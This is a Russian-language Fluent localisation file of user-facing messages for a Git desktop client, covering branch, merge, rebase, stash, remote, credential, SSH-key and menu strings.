branch-already-exists-2 = Ветка «{ $a0 }» уже есть
cant-delete-current-branch = Нельзя удалить текущую ветку
switch-to-another-branch-first = Сначала переключитесь на другую ветку.
branch-is-not-merged-into = Ветка «{ $a0 }» не слита с текущей
commits-that-exist-only-in = Коммиты, которые есть только в этой ветке, станут недоступны (их можно вернуть через Undo).
this-commit-is-already-in = Этот коммит уже есть в текущей ветке
unknown-reset-mode = Неизвестный режим reset
is-already-merged-into = { $a0 } уже слита в { $a1 }
already-contains = { $a0 } уже содержит { $a1 }
already-points-to-this-commit = { $a0 } уже указывает на этот коммит
cant-fast-forward-it-has = Перемотать { $a0 } нельзя: в ней есть коммиты, которых нет в { $a1 }
use-merge-or-rebase = Используйте слияние (merge) или rebase.
no-changes = Нет изменений
files-already-match-this-commit = Файлы уже совпадают с этим коммитом — откатывать нечего
there-are-uncommitted-changes = Есть незакоммиченные изменения ({ $a0 })
commit-them-or-stash-then = Закоммитьте их или сделайте Stash, затем повторите.
untracked-files-are-in-way = Неотслеживаемые файлы мешают откату
move-or-delete = Переместите или удалите: { $a0 }{ $a1 }
files-restored-to-state-of =
    Файлы возвращены к состоянию { $a0 }.
    Отменены изменения { $a1 } коммитов:
    { $a2 }{ $a3 }
files-brought-to-state-of = Файлы приведены к состоянию { $a0 }.
no-operation-in-progress = Нет незавершённой операции
unresolved-conflicts-remain = Остались неразрешённые конфликты: { $a0 }
fix-files-marked-u-and = Исправьте файлы с пометкой U и застейджите их (кнопка + в списке файлов).

## crates/gorynych-git/src/actions/remote.rs

add-remote-git-remote-add = Добавьте remote: git remote add origin <url>
no-access-to = Нет доступа к { $a0 }
no-write-access = Нет прав на запись
unknown-pull-mode = Неизвестный режим pull
branch-has-no-upstream = У ветки «{ $a0 }» нет upstream
push-it-branch-will-be = Сделайте Push — ветка будет опубликована и связана с remote.
remote-branch-was-deleted = Remote-ветка { $a0 } удалена
push-to-create-it-again = Сделайте Push, чтобы создать её заново, или переключитесь на другую ветку.
has-commits-that-your-branch = На { $a0 } есть коммиты, которых нет в вашей ветке
pull-and-push-again-or = Сделайте Pull и повторите Push, либо Force Push (with lease), чтобы перезаписать remote-ветку.
remote-not-found = Remote «{ $a0 }» не найден
branch-no-longer-exists-on = Ветки { $a0 } уже нет на { $a1 }
it-was-deleted-earlier-branch = Её удалили раньше — список веток обновлён.
cant-delete-its-repositorys-default = Нельзя удалить { $a0 }: это основная ветка репозитория на сервере
change-default-branch-in-project = Сначала смените ветку по умолчанию в настройках проекта на GitLab/GitHub.
branch-is-protected-on-server = Ветка { $a0 } защищена на сервере — удалить её нельзя
remove-branch-protection-in-project = Снимите защиту ветки в настройках проекта (Settings → Repository → Protected branches) или удалите её в веб-интерфейсе.
was-deleted-on-server = { $a0 } удалена на сервере
nothing-to-update-from-branch = Обновлять неоткуда: ветку на сервере удалили.
update-2 = обновление
has-its-own-commits-cant = В { $a0 } есть свои коммиты — перемотать нельзя
use-pull-merge-or-rebase = Используйте Pull (merge или rebase), чтобы объединить изменения.
update-would-touch-files-with = Обновление затронет файлы с вашими незакоммиченными правками
commit-or-stash-your-changes = Закоммитьте или спрячьте правки (Stash) и повторите.
has-unpushed-commits = В { $a0 } есть неотправленные коммиты ({ $a1 })
cant-update-without-switching-switch = Без переключения обновить нельзя: переключитесь на ветку и сделайте Pull (merge или rebase).
has-diverged-from = { $a0 } разошлась с { $a1 }
switch-to-branch-and-pull = Переключитесь на ветку и сделайте Pull (merge или rebase).
is-checked-out-in-another = { $a0 } открыта в другой рабочей папке (worktree)
branch-has-no-branch-on = У ветки «{ $a0 }» нет ветки на сервере
push-to-publish-it = Сделайте Push, чтобы опубликовать её.

## crates/gorynych-git/src/actions/state.rs

cant-is-not-finished = Нельзя сделать { $a0 }: не завершён { $a1 }
resolve-conflicts-and-click-continue = Разрешите конфликты и нажмите «Продолжить» в жёлтой панели сверху, либо «Прервать».
cant-repository-has-no-commits = Нельзя сделать { $a0 }: в репозитории ещё нет коммитов
cant-from-detached-head = Нельзя сделать { $a0 } из состояния detached HEAD
switch-to-branch-double-click = Переключитесь на ветку (двойной клик по ветке в списке слева) или создайте новую.
cant-no-commits = Нельзя сделать { $a0 }: нет коммитов

## crates/gorynych-git/src/clone.rs

choose-folder-to-clone-into = Выберите папку для клонирования
invalid-folder-name = Недопустимое имя папки
folder-not-found = Папка не найдена: { $a0 }
folder-already-exists-and-isnt = Папка «{ $a0 }» уже существует и не пуста
choose-different-name-or-different = Выберите другое имя или другую папку.
counting-objects = Подсчёт объектов
compressing-on-server = Сжатие на сервере
downloading = Загрузка
processing = Обработка
unpacking-files = Распаковка файлов
cloning-canceled = Клонирование отменено
done = Готово

## crates/gorynych-git/src/compare.rs

same-commit-is-selected = Выбран один и тот же коммит
invalid-regular-expression = Неверное регулярное выражение
expression-matches-empty-string = Выражение совпадает с пустой строкой
query-is-too-long = Слишком длинный запрос

## crates/gorynych-git/src/conflicts.rs

mine = Моё
your-current-branch = Ваша текущая ветка
theirs = Их
incoming-branch = Вливаемая ветка
incoming-branch-2 = Вливаемая ветка · «{ $a0 }»
branch-youre-rebasing-onto-already = Ветка, на которую вы перебазируете (уже на сервере / в upstream)
your-commit = ваш коммит
your-commit-thats-being-moved = Ваш коммит, который сейчас переносится
commit-being-moved = Переносимый коммит
commit-revert = Отмена коммита
changes-from-cherry-pick = Изменения из cherry-pick
revert-changes = Изменения revert
current = Текущее
working-version = рабочая версия
file-before-applying-stash = Файл до применения stash
from-stash = Из stash
stashed-changes = спрятанные изменения
changes-from-stash = Изменения из stash
conflict-markers-remain-in-result = В результате остались маркеры конфликта
resolve-all-conflict-blocks = Решите все блоки конфликта.
invalid-side = Некорректная сторона
file-still-has-conflict-markers = В файле ещё есть маркеры конфликта
resolve-conflict-in-editor-or = Решите конфликт в редакторе или отметьте принудительно.

## crates/gorynych-git/src/diff.rs

unknown-diff-mode = Неизвестный режим diff

## crates/gorynych-git/src/history.rs

no-file-specified = Не указан файл
file-isnt-in-version = Файла { $a0 } нет в версии { $a1 }
file-doesnt-exist = Файла { $a0 } нет
file-may-have-been-created = Возможно, файл был создан позже или переименован

## crates/gorynych-git/src/init.rs

general-os-and-editors = Общий (ОС и редакторы)
os = # ОС
editors = # Редакторы
logs-and-secrets = # Логи и секреты
no-folder-specified = Не указана папка
this-isnt-folder = Это не папка
invalid-email = Некорректный email: «{ $a0 }»
this-folder-is-already-git = Эта папка уже является Git-репозиторием
enter-author-name-for-first = Укажите имя автора для первого коммита
enter-author-email-for-first = Укажите email автора для первого коммита
remote-address-must-not-contain = Адрес remote не должен содержать пробелов
name-and-email-for-all = Имя и email (для всех репозиториев)
name-and-email-for-this = Имя и email (для этого репозитория)
first-commit = Первый коммит
specify-repository-address = Укажите адрес репозитория
address-must-not-contain-spaces = Адрес не должен содержать пробелов
doesnt-look-like-git-repository = Не похоже на адрес Git-репозитория
example-https-gitlab-com-user = Пример: https://gitlab.com/user/project.git или git@gitlab.com:user/project.git
gitlab-over-https-sign-in = GitLab по HTTPS: войдите через окно Git Credential Manager или используйте Personal Access Token (scope: read_repository и write_repository) вместо пароля. По SSH: добавьте публичный ключ в GitLab → Preferences → SSH Keys.
github-over-https-sign-in = GitHub по HTTPS: войдите через окно Git Credential Manager или используйте Personal Access Token. По SSH: добавьте ключ в Settings → SSH and GPG keys.
this-folder-already-has-git = В этой папке уже есть Git-репозиторий
enter-author-name-for-commit = Укажите имя автора для коммита
enter-author-email-for-commit = Укажите email автора для коммита
server-has-no-branch = На сервере нет ветки «{ $a0 }»
author-name-and-email = Имя и email автора
downloading-from-server = Загрузка { $a0 } с сервера
applying-server-history = Наложение истории сервера
commit-project-files = Коммит файлов проекта
in-gitlab-main-branch-is = В GitLab основная ветка защищена: пушить в неё могут только Maintainer. Попросите роль Maintainer, снимите защиту (Settings → Repository → Protected branches) или отправьте изменения в отдельную ветку.

## crates/gorynych-git/src/read.rs

folder-isnt-git-repository = Папка не является Git-репозиторием: { $a0 }
invalid-commit-hash = Некорректный хэш коммита

## crates/gorynych-git/src/rebase.rs

finish-current-operation-first-merge = Сначала завершите текущую операцию (merge / rebase / cherry-pick)
continue-or-abort-it-in = Продолжите или прервите её в жёлтой панели сверху.
repository-has-no-commits-yet = В репозитории ещё нет коммитов
rebase-works-on-branch-but = Rebase делается для ветки, а сейчас detached HEAD
switch-to-branch-whose-history = Переключитесь на ветку, историю которой хотите изменить.
no-specified-2 = Не указан { $a0 }
commit = коммит
this-is-branchs-last-commit = Это и есть последний коммит ветки — после него нечего менять
too-many-commits-for-rebase = Слишком много коммитов для rebase: { $a0 }
choose-closer-point-no-more = Выберите точку поближе (не больше { $a0 } коммитов).
rebase-preview-needs-git-2 = Для предпросмотра rebase нужен Git 2.40 или новее
update-git-for-windows-git = Обновите Git for Windows (git-scm.com) и перезапустите приложение.
plan-is-outdated-commit-list = План устарел — список коммитов изменился
open-rebase-again = Откройте rebase заново.
commit-message-cant-be-empty = Сообщение коммита не может быть пустым
first-commit-has-nothing-to = Первый коммит не с чем объединить
squash-and-fixup-join-commit = Squash и fixup присоединяют коммит к предыдущему — у самого первого предыдущего нет.
very-first-commit-of-repository = Нельзя перенести самый первый коммит репозитория
invalid-preview = Некорректный предпросмотр
branch-changed-after-preview = Ветка изменилась после предпросмотра
preview-will-refresh-check-it = Предпросмотр обновится — проверьте его и примените снова.
nothing-changes = Ничего не меняется
invalid-preview-result = Некорректный результат предпросмотра
rebase-preview = rebase (предпросмотр): { $a0 }
uncommitted-edits-in-files-rebase = Незакоммиченные правки в файлах, которые меняет rebase
commit-them-or-stash-then-apply = Закоммитьте их или сделайте Stash, затем примените rebase.
rebase-stopped-at-conflict = Rebase остановился на конфликте
resolve-conflicts-in-files-and = Разрешите конфликты в файлах и нажмите «Продолжить» в жёлтой панели сверху. «Прервать» вернёт всё как было.

## crates/gorynych-git/src/restore.rs

file-is-neither-in-working = Файла нет ни в рабочей папке, ни в той версии — менять нечего
file-already-matches-this-version = Файл уже совпадает с этой версией
no-files-selected = Не выбраны файлы
this-isnt-stash = Это не stash
invalid-file = Некорректный файл
file-isnt-in-stash = Файла { $a0 } нет в stash
these-files-in-working-folder = Эти файлы в рабочей папке уже такие же, как в stash
unknown-mode = Неизвестный режим
unknown-hunk-action = Неизвестное действие с фрагментом
binary-file-cant-be-changed = Бинарный файл — по фрагментам не меняется
use-restore-file-to-its = Используйте «Вернуть файл к версии…» для всего файла.
file-has-no-changes = В файле нет изменений
hunk-not-found-diff-changed = Фрагмент не найден — diff изменился
refresh-view-if-ignore-whitespace = Обновите просмотр. Если включено «игнорировать пробелы», выключите его: фрагменты считаются по точному тексту.
file-isnt-in-working-folder = Файла нет в рабочей папке
use-restore-file-to-its-version = Используйте «Вернуть файл к версии до этого коммита» — он создаст файл заново.
restore-whole-file-from-stash = Восстановите файл из stash целиком.
hunk-doesnt-apply-these-lines = Фрагмент не применяется: эти строки в рабочей папке уже другие
restore-whole-file-from-stash-it = Восстановите файл из stash целиком (он заменит текущую версию; Undo вернёт).
this-hunk-is-already-changed = Этот фрагмент уже изменён в рабочей папке — автоматически отменить нельзя
lines-around-it-changed-after = Строки вокруг него поменялись после коммита. Можно вернуть файл целиком к версии до этого коммита.
hunk-doesnt-apply-file-changed = Фрагмент не применяется — файл изменился
refresh-view-and-retry = Обновите просмотр и повторите.
cant-undo-file-changed-after = Нельзя отменить: файл { $a0 } изменился после операции
file-was-edited-after-revert = Файл правили после отката — верните его вручную или через diff.

## crates/gorynych-git/src/run.rs

looked-for-git-exe-in =
    Искали git.exe в:
    { $a0 }

## crates/gorynych-git/src/worktree_file.rs

file-is-not-in-working = Файл не найден в рабочей папке
symbolic-link-cant-be-edited = Символическую ссылку нельзя редактировать как файл
binary-file-cant-be-edited = Двоичный файл нельзя редактировать как текст
file-isnt-utf-8-encoded = Файл не в кодировке UTF-8 — редактирование недоступно

## crates/gorynych-git/src/write.rs

invalid-file-list = Некорректный список файлов
empty-commit-message = Пустое сообщение коммита
template-file-not-found = Файл шаблона не найден: { $a0 }
template-file-is-too-large = Файл шаблона слишком большой (больше 64 КБ)
invalid-branch-name-2 = Некорректное имя ветки

## crates/gorynych-storage/src/credentials/mod.rs

unknown-server-type = Неизвестный тип сервера
no-credentials-are-needed-for = Для локального адреса учётные данные не нужны
no-sign-in-method-selected = Не выбран способ входа
username-password-and-token-work = Логин/пароль и токен работают только для адресов https://
remote-address-is-ssh-choose = Адрес remote — SSH. Выберите вкладку «SSH-ключ» или смените адрес remote на https://.
over-http-password-or-token = По адресу http:// пароль и токен передаются открытым текстом
change-remote-address-to-https = Смените адрес remote на https:// или войдите SSH-ключом.
ssh-key-works-only-for = SSH-ключ работает только для адресов SSH (git@host:… или ssh://…)
remote-address-is-https-sign = Адрес remote — https://. Войдите логином и паролем или токеном, либо смените адрес remote на SSH.
for-example-https-gitlab-com = Например: https://gitlab.com/group/project.git
enter-username = Введите имя пользователя
enter-token = Введите токен
enter-password = Введите пароль
line-break-in-username-or = Перевод строки в логине или пароле недопустим
choose-private-key-file = Выберите файл приватного ключа
key-file-not-found = Файл ключа не найден
this-is-public-key-pub = Это публичный ключ (.pub) — выберите приватный, без расширения
pipeline-token-must-not-contain = В токене для пайплайнов не должно быть пробелов

## crates/gorynych-storage/src/credentials/target.rs

doesnt-look-like-server-address = Не похоже на адрес сервера
specify-server-address = Укажите адрес сервера
for-example-gitlab-company-com = Например: gitlab.company.ru
for-example-gitlab-company-com-or = Например: gitlab.company.ru или https://git.company.ru:8443

## crates/gorynych-storage/src/db.rs

settings-storage-unavailable = Хранилище настроек недоступно

## crates/gorynych-storage/src/repo_providers.rs

api-address-must-start-with = Адрес API должен начинаться с https://
invalid-api-address = Некорректный адрес API
for-example-https-gitlab-company = Например: https://gitlab.company.ru или https://github.company.ru/api/v3
unknown-ci-cd-provider = Неизвестный провайдер CI/CD

## crates/gorynych-storage/src/secrets.rs

encryption-isnt-available-in-system = Шифрование недоступно в системе — данные нельзя сохранить безопасно

## crates/gorynych-storage/src/ssh_keys.rs

unknown-key-type = Неизвестный тип ключа
key-file-name-no-folders = Имя файла ключа — без папок, точки в начале и .pub на конце
couldnt-create-ssh-key = Не удалось создать SSH-ключ
ssh-keygen-program-wasnt-found = Не найдена программа ssh-keygen. Установите OpenSSH или Git for Windows.

## crates/gorynych-tauri/src/commands/creds.rs

specify-full-repository-address = Укажите полный адрес репозитория
for-example-https-gitlab-company-com = Например: https://gitlab.company.ru/group/project.git
remote-address-is-no-longer = Адрес remote уже не https:// — менять нечего
theres-no-pub-file-next = Рядом с ключом нет файла .pub

## crates/gorynych-tauri/src/commands/desktop.rs

open-git-repository = Открыть Git-репозиторий
private-ssh-key = Приватный SSH-ключ
this-format-isnt-supported = Этот формат не поддерживается
image-is-too-large-mb = Картинка слишком большая ({ $a0 } МБ, максимум 25 МБ)
images = Изображения
background-image = Картинка для фона
save-artifact = Сохранить артефакт
archive = Архив
folder-not-found-2 = Папка не найдена
couldnt-open-folder = Не удалось открыть папку
command-prompt = Командная строка
couldnt-open-terminal = Не удалось открыть терминал
none-of-known-terminals-was = Не найден ни один из известных терминалов. Откройте папку вручную.

## crates/gorynych-tauri/src/commands/menu.rs

no-actions = Нет действий
about = О программе { $a0 }
settings = Настройки…
hide = Скрыть { $a0 }
hide-others = Скрыть остальные
show-all = Показать все
quit = Завершить { $a0 }
cut = Вырезать
copy = Копировать
paste = Вставить
select-all = Выбрать всё
full-screen = Полноэкранный режим
file-2 = Файл
edit = Правка
view = Вид
actions = Действия
window = Окно
help = Справка
